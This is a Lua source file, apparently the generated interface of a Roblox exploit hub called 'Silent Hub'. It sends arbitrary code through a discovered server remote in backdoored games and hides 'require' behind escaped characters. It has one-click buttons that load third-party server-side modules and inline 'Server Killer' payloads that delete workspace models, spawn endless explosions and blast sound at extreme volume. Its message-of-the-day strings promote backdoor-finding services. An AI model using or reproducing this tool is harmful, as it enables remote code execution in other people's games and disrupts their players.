G2L["7f"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.SilentHub.UI.Open
G2L["80"] = Instance.new("TextButton", G2L["2"]);
G2L["80"]["BorderSizePixel"] = 0;
G2L["80"]["TextSize"] = 20;
G2L["80"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["80"]["BackgroundColor3"] = Color3.fromRGB(51, 51, 51);
G2L["80"]["FontFace"] = Font.new([[rbxassetid://16658221428]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["80"]["Size"] = UDim2.new(0, 90, 0, 30);
G2L["80"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["80"]["Text"] = [[Open]];
G2L["80"]["Name"] = [[Open]];
G2L["80"]["Position"] = UDim2.new(0, 0, 0.75, 0);


-- StarterGui.SilentHub.UI.Open.UICorner
G2L["81"] = Instance.new("UICorner", G2L["80"]);
G2L["81"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.SilentHub.Scripts
G2L["82"] = Instance.new("Folder", G2L["1"]);
G2L["82"]["Name"] = [[Scripts]];


-- StarterGui.SilentHub.Scripts.Loader
G2L["83"] = Instance.new("LocalScript", G2L["82"]);
G2L["83"]["Name"] = [[Loader]];


-- StarterGui.SilentHub.Values
G2L["84"] = Instance.new("Folder", G2L["1"]);
G2L["84"]["Name"] = [[Values]];


-- StarterGui.SilentHub.Values.RemotePath
G2L["85"] = Instance.new("StringValue", G2L["84"]);
G2L["85"]["Name"] = [[RemotePath]];


-- StarterGui.SilentHub.Values.Minimized
G2L["86"] = Instance.new("BoolValue", G2L["84"]);
G2L["86"]["Name"] = [[Minimized]];


-- StarterGui.SilentHub.Values.RemoteFound
G2L["87"] = Instance.new("BoolValue", G2L["84"]);
G2L["87"]["Name"] = [[RemoteFound]];


-- StarterGui.SilentHub.Values.RainbowEnabled
G2L["88"] = Instance.new("BoolValue", G2L["84"]);
G2L["88"]["Name"] = [[RainbowEnabled]];


-- StarterGui.SilentHub.UI.MainContainer.UIDrag
local function C_4()
local script = G2L["4"];
	local UIS = game:GetService("UserInputService")
	local TweenService = game:GetService("TweenService")
	
	local frame = script.Parent
	local dragToggle = nil
	local dragSpeed = 0.06
	local dragStart = nil
	local startPos = nil
	local dragTween
	
	local function updateInput(input)
		local delta = input.Position - dragStart
		local position = UDim2.new(
			startPos.X.Scale,
			startPos.X.Offset + delta.X,
			startPos.Y.Scale,
			startPos.Y.Offset + delta.Y
		)
	
		if dragTween then
			dragTween:Cancel()
		end
	
		dragTween = TweenService:Create(
			frame,
			TweenInfo.new(dragSpeed, Enum.EasingStyle.Linear),
			{Position = position}
		)
		dragTween:Play()
	end
	
	frame.InputBegan:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseButton1
			or input.UserInputType == Enum.UserInputType.Touch then
			dragToggle = true
			dragStart = input.Position
			startPos = frame.Position
	
			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then
					dragToggle = false
				end
			end)
		end
	end)
	
	UIS.InputChanged:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseMovement
			or input.UserInputType == Enum.UserInputType.Touch then
			if dragToggle then
				updateInput(input)
			end
		end
	end)
end;
task.spawn(C_4);
-- StarterGui.SilentHub.UI.MainContainer.Header.Burger.LocalScript
local function C_7()
local script = G2L["7"];
	local tweenservice = game.TweenService
	local collectionservice = game.CollectionService
	
	local button = script.Parent
	local menucontainer = button.Parent.Parent.MenuContainer
	local pagecontainer = button.Parent.Parent.PageContainer
	
	local info = TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
	
	local hidden = false
	
	local function togglemenu()
		if hidden == false then
			hidden = true
			for i, v in pairs(pagecontainer:GetDescendants()) do
				if v:IsA("ScrollingFrame") and collectionservice:HasTag(v, "page") then
					tweenservice:Create(menucontainer, info, {Position = UDim2.new(-0.2, 0, 0.12, 0)}):Play()
					tweenservice:Create(v, info, {Position = UDim2.new(0.096, 0, 0.029, 0)}):Play()
				end
			end
		elseif hidden == true then
			hidden = false
			for i, v in pairs(pagecontainer:GetDescendants()) do
				if v:IsA("ScrollingFrame") and collectionservice:HasTag(v, "page") then
					tweenservice:Create(menucontainer, info, {Position = UDim2.new(0, 0, 0.12, 0)}):Play()
					tweenservice:Create(v, info, {Position = UDim2.new(0.179, 0, 0.029, 0)}):Play()
				end
			end
		end
	end
	
	button.MouseButton1Click:Connect(function()
		togglemenu()
	end)
	
	
	
end;
task.spawn(C_7);
-- StarterGui.SilentHub.UI.MainContainer.Header.Minimize.LocalScript
local function C_9()
local script = G2L["9"];
	local tweenservice = game.TweenService
	
	local button = script.Parent
	local maincontainer = button.Parent.Parent
	
	local info = TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
	
	local minimized = maincontainer.Parent.Parent.Values.Minimized
	
	local size = maincontainer.Size
	
	local minimize = tweenservice:Create(maincontainer, info, {Size = UDim2.new(0, 603, 0, 35)})
	
	local restore = tweenservice:Create(maincontainer, info, {Size = size})
	
	button.MouseButton1Click:Connect(function()
		if minimized.Value == false then
			minimized.Value = true
			minimize:Play()
			button.Text = "_"
			for i, v in pairs(maincontainer:GetDescendants()) do
				if v.Name == "PageContainer" or v.Name == "MenuContainer" then
					v.Visible = false
				end
			end
		elseif minimized.Value == true then
			minimized.Value = false
			restore:Play()
			button.Text = "_"
			for i, v in pairs(maincontainer:GetDescendants()) do
				if v.Name == "PageContainer" or v.Name == "MenuContainer" then
					v.Visible = true
				end
			end
		end
	end)
end;
task.spawn(C_9);
-- StarterGui.SilentHub.UI.MainContainer.Header.Close.LocalScript
local function C_e()
local script = G2L["e"];
	local tweenservice = game.TweenService
	
	local button = script.Parent
	local maincontainer = button.Parent.Parent
	local openbutton = maincontainer.Parent.Open
	
	local info = TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
	
	local closed = true
	
	local minimized = maincontainer.Parent.Parent.Values.Minimized
	
	
	function close()
		closed = true
		button.Interactable = false
		local one = tweenservice:Create(maincontainer, info, {Size = UDim2.new(0, 603, 0, 35)})
		local two = tweenservice:Create(maincontainer, info, {Size = UDim2.new(0, 0, 0, 35)})
		local three = tweenservice:Create(openbutton, info, {Position = UDim2.new(0, 0, 0.75, 0)})
		if maincontainer.Size == UDim2.new(0, 603, 0, 35) or minimized.Value == true then
			two:Play()
			two.Completed:Wait()
			maincontainer.Visible = false
			openbutton.Position = UDim2.new(-0.1, 0, 0.75, 0)
			three:Play()
			button.Interactable = true
		elseif minimized.Value == false then
			one:Play()
			for i, v in pairs(maincontainer:GetDescendants()) do
				if v.Name == "PageContainer" or v.Name == "MenuContainer" then
					v.Visible = false
				end
			end
			one.Completed:Wait()
			two:Play()
			two.Completed:Wait()
			maincontainer.Visible = false
			openbutton.Position = UDim2.new(-0.1, 0, 0.75, 0)
			three:Play()
			button.Interactable = true
		end
	end
	
	function open()
		closed = false
		openbutton.Interactable = false
		local three = tweenservice:Create(openbutton, info, {Position = UDim2.new(-0.1, 0, 0.75, 0)})
		local two = tweenservice:Create(maincontainer, info, {Size = UDim2.new(0, 603, 0, 35)})
		local one = tweenservice:Create(maincontainer, info, {Size = UDim2.new(0, 603, 0, 311)})
		if maincontainer.Size == UDim2.new(0, 603, 0, 35) or minimized.Value == true then
			openbutton.Position = UDim2.new(0, 0, 0.75, 0)
			three:Play()
			maincontainer.Visible = true
			two:Play()
			openbutton.Interactable = true
		elseif minimized.Value == false then
			openbutton.Position = UDim2.new(0, 0, 0.75, 0)
			three:Play()
			maincontainer.Visible = true
			two:Play()
			two.Completed:Wait()
			for i, v in pairs(maincontainer:GetDescendants()) do
				if v.Name == "PageContainer" or v.Name == "MenuContainer" then
					v.Visible = true
				end
			end
			one:Play()
			openbutton.Interactable = true
		end
	end
	
	if closed == false then
		openbutton.Position = UDim2.new(-0.1, 0, 0.75, 0)
	else
		maincontainer.Size = UDim2.new(0, 0, 0, 35)
		for i, v in pairs(maincontainer:GetDescendants()) do
			if v.Name == "PageContainer" or v.Name == "MenuContainer" then
				v.Visible = false
			end
		end
	end
	
	button.MouseButton1Click:Connect(function()
		close()
	end)
	
	openbutton.MouseButton1Click:Connect(function()
		if closed == true then
			open()
		end
	end)
end;
task.spawn(C_e);
-- StarterGui.SilentHub.UI.MainContainer.MenuContainer.LocalScript
local function C_11()
local script = G2L["11"];
	local tweenservice = game:GetService("TweenService")
	
	local info = TweenInfo.new(0.25, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
	
	local menucontainer = script.Parent
	local pages = menucontainer.Parent.PageContainer
	
	local templatebutton = script.Parent.MenuButton
	templatebutton.Visible = false
	
	local buttons = {}
	local currentpage
	
	local pagepositions = {}
	
	for _, page in ipairs(pages:GetChildren()) do
		if page:IsA("Frame") or page:IsA("ScrollingFrame") then
			pagepositions[page] = page.Position
		end
	end
	
	local function update(activepage)
		for _, p in ipairs(pages:GetChildren()) do
			if p:IsA("Frame") or p:IsA("ScrollingFrame") then
				local active = p == activepage
	
				local line = buttons[p.Name].IndicatorLine
				tweenservice:Create(line, info, {
					Size = active
						and UDim2.new(0, 86, 0.05, 0)
						or UDim2.new(0, 0, 0.05, 0)
				}):Play()
			end
		end
	
		if activepage == currentpage then
			return
		end
	
		if currentpage then
			local oldpage = currentpage
	
			local oldtween = tweenservice:Create(oldpage, info, {
				Position = pagepositions[oldpage] - UDim2.new(1, 0, 0, 0)
			})
	
			oldtween:Play()
	
			oldtween.Completed:Connect(function()
				if currentpage ~= oldpage then
					oldpage.Visible = false
					oldpage.Position = pagepositions[oldpage]
				end
			end)
		end
	
		activepage.Position = pagepositions[activepage] + UDim2.new(1, 0, 0, 0)
		activepage.Visible = true
	
		tweenservice:Create(activepage, info, {
			Position = pagepositions[activepage]
		}):Play()
	
		currentpage = activepage
	end
	
	for _, page in ipairs(pages:GetChildren()) do
		if page:IsA("Frame") or page:IsA("ScrollingFrame") then
			local button = templatebutton:Clone()
			button.Parent = menucontainer
			button.Visible = true
			button.Name = page.Name
			button.Text = page.Name
	
			buttons[page.Name] = button
	
			button.MouseButton1Click:Connect(function()
				update(page)
			end)
		end
	end
	
	for _, page in ipairs(pages:GetChildren()) do
		if (page:IsA("Frame") or page:IsA("ScrollingFrame")) and page.Visible then
			page.Position = pagepositions[page]
			update(page)
			break
		end
	end
end;
task.spawn(C_11);
-- StarterGui.SilentHub.UI.MainContainer.PageContainer.Home.ButtonContainer.Discord.LocalScript
local function C_1f()
local script = G2L["1f"];
	local button = script.Parent
	local server = "dsc.gg/teamc00lkidd"
	
	button.Text = "Server: "..server
	
	button.MouseButton1Click:Connect(function()
		if setclipboard then
			setclipboard(server)
			game:GetService("StarterGui"):SetCore("SendNotification", {
			Title = "Silent Hub",
			Text = "Invite link copied!"
			})
		else
			game:GetService("StarterGui"):SetCore("SendNotification", {
			Title = "Silent Hub",
			Text = "setclipboard is not supported on your executor."
			})
		end
	end)
	
end;
task.spawn(C_1f);
-- StarterGui.SilentHub.UI.MainContainer.PageContainer.Home.ButtonContainer.MOTD.LocalScript
local function C_22()
local script = G2L["22"];
	local label = script.Parent
	
	local messages = {
		"There are tons of scripts for you to use in the 'Scripts' tab.",
		"Use the 'Settings' tab to change the appearance of the UI.",
		"Execute scripts and more in the 'Script Editor' tab!",
		"Silent Hub was made with love by @hyperionhax, friend me on Discord! ;)",
		"Your custom UI will save on your device by clicking 'Save Settings' in the Settings tab.",
		"Did you know we have an official Roblox group? come join it through our Discord!",
		"Spooky Scary Skeletons send shivers down your spine!",
		"Convert your character to R6 in the 'Script Editor' tab.",
		"Silent Hub is inspired by Rose Hub! Shoutout to @Java1x3x5x6.",
		"The FitnessGram Pacer Test is a multistage aerobic capacity test that progressively gets more difficult as it continues.",
		"If you shoot rockets at Franklin's house and wait long enough, Franklin will eventually show up to defend his home.",
		"WONGA!",
		"I am the eggman, they are the eggmen, I am the walrus, goo goo g'joob!",
		"Our script editor supports several local scripts.",
		"KNICKS IN 5!!",
		"All require script credits go to their creators!",
		"Circumvention is very hot",
		"In the 'Script Editor' tab, you can change to R6 with the press of a button!",
		"In the 'Script Editor' tab, you can change to R15 with the press of a button!",
		"In the 'Script Editor' tab, you can instantly respawn with the press of a button!",
		"Silent Hub is sponsored by team c00lkidd. B)",
		"Thank you for choosing Silent Hub!",
		"Searching for backdoored games? Head over to Requiem! https://req-exe.win",
		"Do a barrell roll!",
		"Aurora Borealis!? At this time of year, at this time of day, in this part of the country, localized entirely within your kitchen!?",
		"Welcome to paradise.",
		"Chicken Nuggets",
		"Silent Hub for da win!",
		"Hyperion was here. :3",
		"Shoutout to @14anz_exiled and team c00lkidd 3/4!",
		"get toadroasted you baconhaired bozos",
		"all of your base are belong to us",
		"Oh hey, this game is backdoored! :)",
		"Rose Hub reborn!",
		"Do people ever actually read these messages?",
		"Play Lua Script Execution! It's gud. ;)",
		"Great for PCs!"
	}
	
	label.Text = "MOTD: "..messages[math.random(1,#messages)]
end;
task.spawn(C_22);
-- StarterGui.SilentHub.UI.MainContainer.PageContainer.Script Editor.ButtonContainer.Run.LocalScript
local function C_2d()
local script = G2L["2d"];
	local Players = game:GetService("Players")
	local LocalPlayer = Players.LocalPlayer
	
	local button = script.Parent
	local value = button.Parent.Parent.Parent.Parent.Parent.Parent.Values.RemotePath
	local input = button.Parent.Parent.EditorContainer.TextBoxContainer.TextBox
	
	local function getRemoteFromPath(path)
		local remote = game
		for segment in path:gmatch("[^.]+") do
			remote = remote:FindFirstChild(segment)
			if not remote then return nil end
		end
		return remote
	end
	
	local function convert(code)
		local name = LocalPlayer.Name
	
		code = code:gsub("game%.Players%.LocalPlayer", 'game.Players["'..name..'"]')
		code = code:gsub("Players%.LocalPlayer", 'Players["'..name..'"]')
	
		code = code:gsub("require", [=[getfenv()['\114\101\113\117\105\114\101']]=])
	
		code = code:gsub('game:GetService%("Players"%)%.LocalPlayer', 'game:GetService("Players")["'..name..'"]')
		code = code:gsub("game:GetService%('Players'%)%.LocalPlayer", 'game:GetService("Players")["'..name..'"]')
	
		code = code:gsub("LocalPlayer%.Character", 'game.Players["'..name..'"].Character')
		code = code:gsub("LocalPlayer%.CharacterAdded:Wait%(%))", 'game.Players["'..name..'"].Character or game.Players["'..name..'"].CharacterAdded:Wait()')
	
		code = code:gsub("LocalPlayer%.PlayerGui", 'game.Players["'..name..'"]:FindFirstChild("PlayerGui")')
		code = code:gsub("LocalPlayer%.Backpack", 'game.Players["'..name..'"]:FindFirstChild("Backpack")')
	
		code = code:gsub("LocalPlayer:GetMouse%(%))", "nil")
	
		code = code:gsub("workspace%.CurrentCamera", "workspace.CurrentCamera")
		code = code:gsub("game%.CoreGui", 'game.Players["'..name..'"]:FindFirstChild("PlayerGui")')
		code = code:gsub("game:GetService%('CoreGui'%)", 'game.Players["'..name..'"]:FindFirstChild("PlayerGui")')
	
		return code
	end
	
	local function click()
		local path = value.Value
		if not path or path == "" then
			warn("No remote path acquired yet!")
			return
		end
	
		local remote = getRemoteFromPath(path)
		if not remote then return end
	
		local text = convert(input.Text)
	
		local code = "loadstring([==[" .. text .. "]==])()"
	
		if remote:IsA("RemoteEvent") then
			remote:FireServer(code)
		elseif remote:IsA("RemoteFunction") then
			remote:InvokeServer(code)
		end
	end
	
	button.MouseButton1Click:Connect(click)
end;
task.spawn(C_2d);
-- StarterGui.SilentHub.UI.MainContainer.PageContainer.Script Editor.ButtonContainer.Clear.LocalScript
local function C_31()
local script = G2L["31"];
	local button = script.Parent
	local input = button.Parent.Parent.EditorContainer.TextBoxContainer.TextBox
	
	local function click()
		input.Text = ""
	end
	
	button.MouseButton1Click:Connect(click)
end;
task.spawn(C_31);
-- StarterGui.SilentHub.UI.MainContainer.PageContainer.Script Editor.ButtonContainer.R6.LocalScript
local function C_34()
local script = G2L["34"];
	local button = script.Parent
	local value = button.Parent.Parent.Parent.Parent.Parent.Parent.Values.RemotePath
	
	local function click()
		local path = value.Value
	
		if not path or path == "" then
			warn("Silent Hub: No remote path acquired yet!")
			return
		end
	
		local remote = game
		for segment in path:gmatch("[^.]+") do
			remote = remote[segment]
		end
	
		if not remote then
			return
		end
	
		local code = [[
		require(128800686348301):r6("]] .. game.Players.LocalPlayer.Name .. [[")
		]]
	
		if remote:IsA("RemoteEvent") then
			remote:FireServer(code)
		elseif remote:IsA("RemoteFunction") then
			remote:InvokeServer(code)
		end
	end
	
	button.MouseButton1Click:Connect(click)
end;
task.spawn(C_34);
-- StarterGui.SilentHub.UI.MainContainer.PageContainer.Script Editor.ButtonContainer.R15.LocalScript
local function C_37()
local script = G2L["37"];
	local button = script.Parent
	local value = button.Parent.Parent.Parent.Parent.Parent.Parent.Values.RemotePath
	
	local function click()
		local path = value.Value
	
		if not path or path == "" then
			warn("Silent Hub: No remote path acquired yet!")
			return
		end
	
		local remote = game
		for segment in path:gmatch("[^.]+") do
			remote = remote[segment]
		end
	
		if not remote then
			return
		end
	
		local code = [[
		require(79843896299100).R15("]] .. game.Players.LocalPlayer.Name .. [[")
		]]
	
		if remote:IsA("RemoteEvent") then
			remote:FireServer(code)
		elseif remote:IsA("RemoteFunction") then
			remote:InvokeServer(code)
		end
	end
	
	button.MouseButton1Click:Connect(click)
end;
task.spawn(C_37);
-- StarterGui.SilentHub.UI.MainContainer.PageContainer.Script Editor.ButtonContainer.Respawn.LocalScript
local function C_3a()
local script = G2L["3a"];
	local button = script.Parent
	local value = button.Parent.Parent.Parent.Parent.Parent.Parent.Values.RemotePath
	
	local function click()
		local path = value.Value
	
		if not path or path == "" then
			warn("Silent Hub: No remote path acquired yet!")
			return
		end
	
		local remote = game
		for segment in path:gmatch("[^.]+") do
			remote = remote[segment]
		end
	
		if not remote then
			return
		end
	
		local code = [[
		local player = game.Players.]] .. game.Players.LocalPlayer.Name .. [[
		local oldcframe = player.Character.HumanoidRootPart.CFrame
		player.CharacterAppearanceId = 0
		player:LoadCharacter()
		local character = player.Character or player.CharacterAdded:Wait()
		local root = character:WaitForChild("HumanoidRootPart")
		root.CFrame = oldcframe
		]]
	
		if remote:IsA("RemoteEvent") then
			remote:FireServer(code)
		elseif remote:IsA("RemoteFunction") then
			remote:InvokeServer(code)
		end
	end
	
	button.MouseButton1Click:Connect(click)
end;
task.spawn(C_3a);
-- StarterGui.SilentHub.UI.MainContainer.PageContainer.Scripts.SearchBox.LocalScript
local function C_3f()
local script = G2L["3f"];
	local input = script.Parent
	local container = input.Parent:WaitForChild("ButtonContainer")
	
	local function update()
		local text = string.lower(input.Text)
	
		for _, button in ipairs(container:GetChildren()) do
			if (button:IsA("TextButton") or button:IsA("TextLabel")) and button.Name ~= "Button" then
				local buttontext = string.lower(button.Text)
	
				if string.find(buttontext, text, 1, true) then
					button.Visible = true
				else
					button.Visible = false
				end
			end
		end
	end
	
	input:GetPropertyChangedSignal("Text"):Connect(update)
end;
task.spawn(C_3f);
-- StarterGui.SilentHub.UI.MainContainer.PageContainer.Scripts.ButtonContainer.LocalScript
local function C_42()
local script = G2L["42"];
	local player = game.Players.LocalPlayer.Name
	local page = script.Parent
	local RemotePath = page.Parent.Parent.Parent.Parent.Parent.Values:WaitForChild("RemotePath")
	local RemoteFound = page.Parent.Parent.Parent.Parent.Parent.Values:WaitForChild("RemoteFound")
	local template = page.Button
	
	template.Visible = false
	
	while not RemoteFound.Value do
		RemoteFound.Changed:Wait()
	end
	
	while RemotePath.Value == "" do
		RemotePath:GetPropertyChangedSignal("Value"):Wait()
	end
	
	local path = RemotePath.Value
	
	if not path or path == "" then
		warn("Silent Hub: No remote path acquired yet!")
		return
	end
	
	local remote = game
	
	for segment in path:gmatch("[^.]+") do
		remote = remote:FindFirstChild(segment)
		if not remote then
			warn("Couldn't find:", segment)
			return
		end
	end
	
	if not remote then
		return
	end
	
	local function create(name, func)
		local button = template:Clone()
		button.Name = name
		button.Text = name
		button.Visible = true
		button.Parent = page
	
		button.MouseButton1Click:Connect(function()
			func(button)
		end)
	end
	
	local function execute(code)
		local code = [[
		 ]] .. code .. [[
		]]
	
		if remote:IsA("RemoteEvent") then
			remote:FireServer(code)
		elseif remote:IsA("RemoteFunction") then
			remote:InvokeServer(code)
		end
	end
	
	local scripts = {
		{"Infinite Yield", function(button)
			execute('require(7634392335)("' .. player .. '")')
		end},
		
		{"Studio Dummy", function(button)
			execute('require(14013776397).HorizonLC("' .. player .. '")')
		end},
		
		{"Reality Glitcher [R6]", function(button)
			execute('require(4721789462).noxd("' .. player .. '")')
		end},
		
		{"MLG Gun [R6]", function(button)
			execute('require(6802356973).load("' .. player .. '")')
		end},
		
		{"Neptunian V [R6]", function(button)
			execute('require(82295806676393).Neptunian("' .. player .. '")')
		end},
		
		{"Grab Knife V1 [R6]", function(button)
			execute('require(14638461547).GKV1("' .. player .. '")')
		end},
		
		{"Grab Knife V2 [R6]", function(button)
			execute('require(16662799266):Fire("' .. player .. '", "knife")')
		end},
		
		{"Grab Knife V3 [R6]", function(button)
			execute('require(2829943043):Run("' .. player .. '", "i baked you a pie")')
		end},
		
		{"Grab Knife V4 [R6]", function(button)
			execute('require(93444499562289).DE("' .. player .. '")')
		end},
		
		{"9/11", function(button)
			execute('require(5040700729).load("' .. player .. '")')
		end},
		
		{"Disco Fog", function(button)
			execute([[
				local Lighting = game:GetService("Lighting")
			
			
				task.spawn(function()
			Lighting.GlobalShadows = true
			Lighting.FogEnd = 200
			Lighting.TimeOfDay = "00:00:00"
	
			while true do
				for h = 0, 359, 5 do
					if _G.nodisco then return end
	
					local color = Color3.fromHSV(h / 360, 1, 1)
	
					Lighting.Ambient = color
					Lighting.OutdoorAmbient = color
					Lighting.FogColor = color
	
					wait()
				end
			end
		end)
				]])
			
			
		end},
		
		{"Bomb Vest [R6]", function(button)
			execute('require(0x49731b7f).load("' .. player .. '")')
		end},
		
		{"Sledgehammer [R6]", function(button)
			execute('require(8038037940).CLoad("' .. player .. '")')
		end},
		
		{"Dev-Uzi [R6]", function(button)
			execute('require(13612021114):Fire("' .. player .. '", "dev-uzi")')
		end},
		
		{"Dual Ultima [R6]", function(button)
			execute('require(2946060158):Fire("' .. player .. '", "hack")')
		end},
		
		{"Xester [R6]", function(button)
			execute('require(6099241563).load("' .. player .. '")')
		end},
		
		{"Pandora [R6]", function(button)
			execute('require(13260588937).p11("' .. player .. '")')
		end},
		
		{"Cesus", function(button)
			execute('require(119924030819900).CesusTBB("' .. player .. '")')
		end},
		
		{"Ragdoll Pan [R6]", function(button)
			execute([[
			require(2946000013):Fire(']] .. player .. [[', 'hack')
			]])
		end},
		
		{"Doge Army", function(button)
			execute('require(5115249013).fehack("' .. player .. '")')
		end},
		
		{"John Doe [R6]", function(button)
			execute('require(2845929020).ooga("' .. player .. '")')
		end},
		
		{"Red Scythe [R6]", function(button)
			execute('require(3543603059).load("' .. player .. '")')
		end},
		
		{"Server Admin [R6]", function(button)
			execute('require(4665394711).load("' .. player .. '")')
		end},
		
		{"Hacker X [R6]", function(button)
			execute('require(4722260429).load("' .. player .. '")')
		end},
		
		{"Felipe Ascension [R6]", function(button)
			execute('require(5605396200):load("' .. player .. '", "Felipe")')
		end},
		
		{"Killbot", function(button)
			execute('require(110756170974672).killbot("' .. player .. '")')
		end},
		
		{"Noot Noot [Server Killer]", function(button)
			execute([[
			
				--no require here, just us chickens!
	local pingudecal = "http://www.roblox.com/asset/?id=382332426"
	local didpingu = false
	local ScreenGui = Instance.new("ScreenGui",game.Players.]] .. player .. [[.PlayerGui)
	ScreenGui.Name = "nooties"
	local asd = Instance.new("TextButton",ScreenGui)
	asd.BackgroundColor3 = Color3.new(0,0,0)
	asd.BorderColor3 = Color3.new(0,0,0)
	asd.Name = "nooties"
	asd.Position = UDim2.new(1,-150,1,-90)
	asd.Size = UDim2.new(0,150,0,45)
	asd.Font = "SourceSansBold"
	asd.FontSize = "Size32"
	asd.Text = "Noot Noot!"
	asd.TextColor3 = Color3.new(255,255,255)
	asd.MouseButton1Down:connect(function()
	if didpingu == false then
	didpingu = true
	for i,v in pairs(game.Players:GetChildren()) do
	if v:IsA("Player") then
	local nooties = Instance.new("Sound",workspace)
	nooties.SoundId = "http://www.roblox.com/asset/?id=109928136872365"
	nooties.Volume = 10
	nooties.PlaybackSpeed = 0.9
	nooties.Looped = true
	local bassboost = Instance.new("DistortionSoundEffect", nooties)	
	bassboost.Level = 0.8
	local pitchshift = Instance.new("PitchShiftSoundEffect", nooties)	
	pitchshift.Octave = 1.30
	nooties:Play()
	end
	end
	wait(12)
	local Sky = Instance.new("Sky",game.Lighting)
	Sky.SkyboxBk = pingudecal
	Sky.SkyboxDn = pingudecal
	Sky.SkyboxFt = pingudecal
	Sky.SkyboxLf = pingudecal
	Sky.SkyboxRt = pingudecal
	Sky.SkyboxUp = pingudecal
	local function modelasd()
	for i,v in pairs(workspace:GetChildren()) do
	if v:IsA("Model") then
	for i,a in pairs(v:GetChildren()) do
	local top = Instance.new("Decal",a)
	top.Face = "Top"
	top.Texture = pingudecal
	local btm = Instance.new("Decal",a)
	btm.Face = "Bottom"
	btm.Texture = pingudecal
	local lft = Instance.new("Decal",a)
	lft.Face = "Left"
	lft.Texture = pingudecal
	local rft = Instance.new("Decal",a)
	rft.Face = "Right"
	rft.Texture = pingudecal
	local frnt = Instance.new("Decal",a)
	frnt.Face = "Front"
	frnt.Texture = pingudecal
	local bk = Instance.new("Decal",a)
	bk.Face = "Back"
	bk.Texture = pingudecal
	local VTest = Instance.new("ParticleEmitter")  
	VTest.Parent = a
	VTest.Texture = pingudecal
	VTest.Speed = NumberRange.new(200)
	VTest.Rate = 200
	VTest.Size = NumberSequence.new(10000,10000)
	VTest.Lifetime = NumberRange.new(1000)
	local pepe = coroutine.create(function()
	while wait() do
	local Explosion = Instance.new("Explosion",a)
	Explosion.BlastRadius = 10000
	end
	end)
	coroutine.resume(pepe)
	end
	end
	end
	end
	local function partasd()
	for i,a in pairs(workspace:GetChildren()) do
	local top = Instance.new("Decal",a)
	top.Face = "Top"
	top.Texture = pingudecal
	local btm = Instance.new("Decal",a)
	btm.Face = "Bottom"
	btm.Texture = pingudecal
	local lft = Instance.new("Decal",a)
	lft.Face = "Left"
	lft.Texture = pingudecal
	local rft = Instance.new("Decal",a)
	rft.Face = "Right"
	rft.Texture = pingudecal
	local frnt = Instance.new("Decal",a)
	frnt.Face = "Front"
	frnt.Texture = pingudecal
	local bk = Instance.new("Decal",a)
	bk.Face = "Back"
	bk.Texture = pingudecal
	local VTest = Instance.new("ParticleEmitter")  
	VTest.Parent = a
	VTest.Texture = pingudecal
	VTest.Speed = NumberRange.new(200)
	VTest.Rate = 200
	VTest.Lifetime = NumberRange.new(1000)
	VTest.Size = NumberSequence.new(10000,10000)
	local pepe = coroutine.create(function()
	while wait() do
	if a.Name ~= "Head" or "Torso" or "Left Arm" or "Right Arm" or "Left Leg" or "Right Leg" then
	local Explosion = Instance.new("Explosion",a)
	Explosion.BlastRadius = 10000
	end
	end
	end)
	coroutine.resume(pepe)
	end
	end
	partasd()
	modelasd()
	else
	warn("Already Ran! Did not execute the script!")
	end
	end)
			
			]])
		end},
		
		{"Minecraft Steve [R6]", function(button)
			execute('require(16756009191).mc("' .. player .. '")')
		end},
		
		{"Toadroast [Server Killer]", function(button)
			execute([[
			
		wait(0)
	math.randomseed(tick() % 1 * 1e6)
	sky = coroutine.create(function()
		while wait(0.3) do
			s = Instance.new("Sky",game.Lighting)
			s.SkyboxBk,s.SkyboxDn,s.SkyboxFt,s.SkyboxLf,s.SkyboxRt,s.SkyboxUp = "rbxassetid://201208408","rbxassetid://201208408","rbxassetid://201208408","rbxassetid://201208408","rbxassetid://201208408","rbxassetid://201208408"
			s.CelestialBodiesShown = false
		end
	end)
	 
	 
	del = coroutine.create(function()
		while wait() do
			for i,v in pairs(workspace:GetChildren()) do
				if v:IsA("Model") then
					v:Destroy()
				end
			end
		end
	end)
	 
	 
	 
	for i,v in pairs(game.Players:GetChildren()) do
	end
	 
	noises = {'rbxassetid://230287740','rbxassetid://271787597','rbxassetid://153752123','rbxassetid://271787503'}
	 
	sound = coroutine.create(function()
		a = Instance.new("Sound",workspace)
		a.SoundId = "rbxassetid://141509625"
		a.Name = "RAINING MEN"
		a.Volume = 58359
		a.Looped = true
		a:Play()
		while wait(0.2) do
			rainin = workspace:FindFirstChild("RAINING MEN")
			if not rainin then
				a = Instance.new("Sound",workspace)
				a.SoundId = "rbxassetid://9007859985"
				a.Name = "RAINING MEN"
				a.Volume = 58359
				a.Looped = true
				a:Play()
			end
		end
	end)
	 
	msg = coroutine.create(function()
		while wait(0.4) do
			msg = Instance.new("Message",workspace)
			msg.Text = "get toadroasted you bacon haired bozos"
		wait(0.4)
			msg:Destroy()
		end
	end)
	 
	 
	rain = coroutine.create(function()
		while wait(10 % 1 * 1e2) do
			part = Instance.new("Part",workspace)
			part.Name = "Meshes/toad (3)"
	 
			mesh = Instance.new("SpecialMesh",part)
	 
			sound = Instance.new("Sound",workspace)
	 
			part.CanCollide = false
			part.Size = Vector3.new(440,530,380)
			part.Position = Vector3.new(math.random(-3000,1000),math.random(1,3000),math.random(-3000,3000))
	 
			sound.SoundId = noises[math.random(1,#noises)]
			sound:Play()
			sound.Ended:connect(function()
				sound:Destroy()
			end)
	 
	 
			mesh.MeshType = "FileMesh"
			mesh.MeshId = "rbxassetid://7234998844"
			mesh.TextureId = "rbxassetid://1009824086"
		end
	end)
	coroutine.resume(sky)
	coroutine.resume(del)
	coroutine.resume(sound)
	coroutine.resume(msg)
	coroutine.resume(rain)
	 
	local sound = Instance.new("Sound")
	local distortion = Instance.new("DistortionSoundEffect")
	 
	sound.Name = "Sound"
	sound.SoundId = "http://www.roblox.com/asset/?id=82490517845599" --Song
	sound.Volume = 999999
